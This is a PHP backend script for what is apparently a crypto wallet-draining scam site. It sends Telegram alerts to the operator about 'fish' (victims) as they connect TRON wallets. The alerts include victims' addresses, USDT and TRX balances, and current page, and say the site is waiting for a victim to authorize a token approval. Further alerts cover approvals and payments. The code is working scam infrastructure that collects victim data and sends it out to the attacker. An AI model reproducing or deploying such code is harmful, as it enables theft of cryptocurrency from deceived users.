<?php
header('Content-Type: application/json');
require_once '../../../../thinkphp/base.php';
use think\Db;
use think\Exception;

class TelegramNotificationHandler {
    private $botKey;
    private $chatId;
    private $config;
    private $logs = [];
    
    private function addLog($type, $message, $data = null) {
        $this->logs[] = [
            'time' => date('Y-m-d H:i:s'),
            'type' => $type,
            'message' => $message,
            'data' => $data
        ];
    }
    
    public function getLogs() {
        return $this->logs;
    }
    
    public function __construct() {
        try {
            $this->addLog('info', '开始初始化TelegramNotificationHandler');
            
            $configPath = __DIR__ . '/../../../../application/database.php';
            $this->addLog('info', '加载数据库配置', ['path' => $configPath]);
            
            $this->config = include $configPath;
            Db::setConfig($this->config);
            $this->addLog('info', '数据库配置加载成功');
            
            $options = Db::name('options')
                ->whereIn('name', ['bot_key', 'notification_id'])
                ->select();
            
            $this->addLog('info', '数据库查询完成', ['options_count' => count($options)]);
                
            foreach ($options as $option) {
                if ($option['name'] === 'bot_key') {
                    $this->botKey = $option['value'];
                    $this->addLog('info', '获取到bot_key');
                } elseif ($option['name'] === 'notification_id') {
                    $this->chatId = $option['value'];
                    $this->addLog('info', '获取到notification_id');
                }
            }
                
            if (empty($this->botKey)) {
                throw new Exception('机器人密钥未在数据库中配置');
            }
            if (empty($this->chatId)) {
                throw new Exception('通知ID未在数据库中配置');
            }
            
            $this->addLog('info', '初始化完成');
        } catch (Exception $e) {
            $this->addLog('error', '初始化失败', [
                'message' => $e->getMessage(),
                'file' => $e->getFile(),
                'line' => $e->getLine()
            ]);
            throw $e;
        }
    }

    private function sendTelegramMessage($message, $keyboard) {
        try {
            $this->addLog('info', '开始发送Telegram消息');
            
            $ch = curl_init();
            $apiUrl = "https://149.154.167.220/bot{$this->botKey}/sendMessage";
            
            $postData = [
                'chat_id' => $this->chatId,
                'text' => $message,
                'parse_mode' => 'HTML',
                'reply_markup' => $keyboard
            ];
            
            $this->addLog('info', '准备发送请求', ['url' => $apiUrl]);
            
            curl_setopt_array($ch, [
                CURLOPT_URL => $apiUrl,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_POST => true,
                CURLOPT_CONNECTTIMEOUT => 5,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => 0,
                CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
                CURLOPT_DNS_CACHE_TIMEOUT => 3,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                CURLOPT_ENCODING => '',
                CURLOPT_POSTFIELDS => json_encode($postData),
                CURLOPT_HTTPHEADER => [
                    'Content-Type: application/json',
                    'Accept: application/json',
                    'Connection: close',
                    'Host: api.telegram.org'
                ]
            ]);

            $response = curl_exec($ch);
            $error = curl_error($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            
            curl_close($ch);

            $this->addLog('info', '请求完成', [
                'http_code' => $httpCode,
                'response' => $response,
                'error' => $error
            ]);

            if ($error || $httpCode !== 200) {
                throw new Exception("Telegram API请求失败: 错误信息: $error, HTTP状态码: $httpCode, 响应: $response");
            }

            $result = json_decode($response, true);
            if (!$result || !isset($result['ok']) || $result['ok'] !== true) {
                throw new Exception("Telegram API响应错误: $response");
            }

            $this->addLog('info', '消息发送成功');
            return $result;
            
        } catch (Exception $e) {
            $this->addLog('error', '发送消息失败', [
                'message' => $e->getMessage()
            ]);
            throw $e;
        }
    }

    private function handleWalletConnect($data) {
        $message = sprintf(
            "📣 访问播报：当前有鱼儿正在访问网站\n\n" .
            "📦 商品名称：<code>%s</code>\n\n" .
            "💸 订单金额：<code>%s USDT</code>\n\n" .
            "🆔 商品订单号：<code>%s</code>\n\n" .
            "🐟 鱼苗地址：%s<code>%s</code>\n\n" .
            "🪫 TRX余额：<code>%s</code>\n\n" .
            "💵 USDT余额：<code>%s</code>\n\n" .
            "👁‍🗨正在等待鱼苗输入钱包密码进行授权...",
            $data['goodsName'],
            $data['totalPrice'],
            $data['orderId'],
            $data['tgusername'] ? "@{$data['tgusername']}\n" : '',
            $data['address'],
            $data['trxBalance'],
            $data['usdtBalance']
        );

        $keyboard = [
            'inline_keyboard' => [[
                ['text' => "🌍 点击进入鱼苗当前浏览页面", 'url' => $data['currentUrl']]
            ]]
        ];

        return $this->sendTelegramMessage($message, $keyboard);
    }

    private function handleApproval($data) {
        $message = $data['tgusername'] 
            ? "@{$data['tgusername']} 请查看最新的授权信息\n可输入命令<code> 鱼池 </code>查看和管理你的鱼苗" 
            : "请查看最新的授权信息。";
    
        $keyboard = [
            'inline_keyboard' => [[
                ['text' => "🌍查看最新的授权信息", 'url' => "https://tronscan.org/#/transaction/{$data['txid']}"]
            ]]
        ];
    
        return $this->sendTelegramMessage($message, $keyboard);
    }

    private function handlePayment($data) {
        $message = sprintf(
            "<b>【💰收款通知💰】</b>\n\n" .
            "<b>📢订单号：</b><code>%s</code>\n\n" .
            "<b>💳支付地址：</b><code>%s</code>\n\n" .
            "<b>🏦收款地址：</b><code>%s</code>\n\n" .
            "<b>💵支付金额：</b><code>%s USDT</code>",
            $data['orderId'],
            $data['userAddress'],
            $data['paymentAddress'],
            number_format($data['totalPrice'], 6)
        );

        $keyboard = [
            'inline_keyboard' => [[
                ['text' => "🌍查看交易详情", 'url' => "https://tronscan.org/#/transaction/{$data['txid']}"]
            ]]
        ];

        return $this->sendTelegramMessage($message, $keyboard);
    }

    public function handleNotification($type, $data) {
        $this->addLog('info', '处理通知', ['type' => $type]);
        try {
            switch ($type) {
                case 'wallet_connect':
                    return $this->handleWalletConnect($data);
                case 'approval':
                    return $this->handleApproval($data);
                case 'payment':
                    return $this->handlePayment($data);
                default:
                    throw new Exception('未知的通知类型');
            }
        } catch (Exception $e) {
            $this->addLog('error', '通知处理失败', [
                'message' => $e->getMessage()
            ]);
            throw $e;
        }
    }
}

try {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    if (!$data || !isset($data['type']) || !isset($data['data'])) {
        throw new Exception('请求数据无效: ' . $input);
    }

    $handler = new TelegramNotificationHandler();
    $result = $handler->handleNotification($data['type'], $data['data']);

    echo json_encode([
        'success' => true,
        'message' => '通知发送成功',
        'result' => $result,
        'logs' => $handler->getLogs()
    ], JSON_UNESCAPED_UNICODE);

} catch (Exception $e) {
    $logs = isset($handler) ? $handler->getLogs() : [];
    echo json_encode([
        'success' => false,
        'message' => $e->getMessage(),
        'debug_info' => [
            'input' => isset($input) ? $input : null,
            'error' => $e->getMessage(),
            'file' => $e->getFile(),
            'line' => $e->getLine(),
            'trace' => $e->getTraceAsString()
        ],
        'logs' => $logs
    ], JSON_UNESCAPED_UNICODE);
}